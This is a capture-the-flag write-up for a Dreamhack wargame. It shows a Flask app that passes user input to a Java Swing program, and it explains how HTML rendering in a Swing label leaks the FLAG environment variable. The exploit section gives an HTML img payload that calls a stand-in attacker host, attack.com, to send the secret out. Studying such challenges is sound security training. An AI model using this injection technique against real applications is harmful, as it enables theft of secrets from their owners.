# dream-hack-J.S-Wargame
## Source:
```
from flask import Flask, request, render_template, Response
import os, subprocess

app = Flask(__name__)

PORT = int(os.getenv("PORT", "8080"))
JAR_PATH = os.getenv("JAR_PATH", "/app/swing.jar")

@app.get("/")
def index():
    return render_template("index.html")

@app.post("/submit")
def submit():
    t1 = request.form.get("text1", "")
    t2 = request.form.get("text2", "")

    try:
        p = subprocess.run(
            ["java", "-Djava.awt.headless=true", "-jar", JAR_PATH, t1, t2], # Run the Java application with the provided arguments
            capture_output=True,
            text=True,
            timeout=15,
        )
        result = "success" if p.returncode == 0 else "fail"
    except Exception:
        result = "error"

    return Response(
        f"""<!doctype html><html><body>
<script>alert("{result}");location.replace("/");</script>
</body></html>""",
        mimetype="text/html",
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
```
The server receives two fields, text1 and text2, and then passes them as arguments into the program `/app/swing.jar`.

Read swing.java (a Java file that can be compiled into a jar to run):
```java
import javax.swing.*;

public class Swing {
    JTextField TextField1 = new JTextField(20); // declare the first JTextField with a length of 20 characters
    JTextField TextField2 = new JTextField(20); // declare the second JTextField with a length of 20 characters


    JLabel Label = new JLabel(System.getenv().getOrDefault("FLAG", "DH{FAKE_FLAG}")); // declare a JLabel whose content is the value of the FLAG environment variable, or "DH{FAKE_FLAG}" if it is not set

    Swing(String t1, String t2) { 
        TextField1.addActionListener(e -> Label.setText(TextField1.getText() + Label.getText())); // when Enter is pressed in TextField1, TextField1's content is prepended to the Label
        TextField2.addActionListener(e -> Label.setText(Label.getText() + TextField2.getText())); // when Enter is pressed in TextField2, TextField2's content is appended to the Label

        TextField1.setText(t1); // set TextField1's value to t1
        TextField2.setText(t2); // set TextField2's value to t2


        TextField1.postActionEvent(); // fire TextField1's ActionListener, causing its content to be prepended to the Label
        TextField2.postActionEvent(); // fire TextField2's ActionListener, causing its content to be appended to the Label
    }

    public static void main(String[] args) throws Exception {        
        System.setProperty("java.awt.headless", "true");
        SwingUtilities.invokeAndWait(() -> new Swing(args[0], args[1]));
    }
}
```
## Exploit:
After investigating, I realized that a few simple HTML tags can be rendered inside a [Java Swing](https://docs.oracle.com/javase/tutorial/uiswing/components/html.html) component.
Since TextField1, FLAG, and TextField2 are concatenated into a single string in exactly that order, we can abuse this to leak the flag by using the tag: `<img src='http://attack.com'>`

## Get the Flag

<img width="252" height="27" alt="image" src="https://github.com/user-attachments/assets/c244238e-5588-477a-a2bf-0918a361b31f" />
